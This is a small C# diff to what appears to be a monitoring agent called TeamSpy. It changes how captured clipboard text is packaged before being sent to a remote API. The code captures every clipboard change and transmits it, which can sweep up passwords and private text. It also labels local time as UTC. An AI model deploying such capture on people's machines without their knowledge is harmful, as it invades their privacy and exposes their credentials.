@@ -28,7 +28,11 @@ namespace TeamSpy.Agent
                 string currentClipboardText = GetText();
                 if (!string.IsNullOrEmpty(currentClipboardText) && currentClipboardText != _lastClipboardText)
                 {
-                    _ = _apiClient.SendDataAsync("clipboard", new { Timestamp = DateTime.Now, Content = currentClipboardText });
+                    _ = _apiClient.SendDataAsync("clipboard", new { 
+                        contentType = "text",
+                        content = currentClipboardText,
+                        timestamp = DateTime.Now.ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
+                    });
                     _lastClipboardText = currentClipboardText;
                 }
             }
